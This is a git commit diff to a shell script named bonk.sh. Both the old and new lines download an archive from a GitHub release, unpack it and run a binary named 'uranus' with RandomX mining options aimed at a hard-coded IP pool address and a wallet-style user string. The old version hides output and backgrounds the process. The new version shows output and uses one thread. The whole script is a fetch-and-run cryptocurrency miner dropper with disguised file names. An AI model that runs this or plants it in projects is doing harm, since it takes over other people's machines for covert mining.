0c13147a04afce5f0d4038471bdddd5afcc8af11
preak07 <160253225+preak07@users.noreply.github.com>
2024-02-24 12:10:20 +0700

    Update bonk.sh

--- bonk.sh
+++ bonk.sh
@@ -1,6 +1,6 @@
-wget https://github.com/komprengaw/rengaw/releases/download/demon/daemon.tar.gz > /dev/null 2>&1 && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -p "vivo1" -t 2 > /dev/null 2>&1 &
+wget https://github.com/komprengaw/rengaw/releases/download/demon/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -p "vivo1" -t 1
 while true
 do
-        echo "gasss........!"
+        echo "Download"
         sleep 20
 done
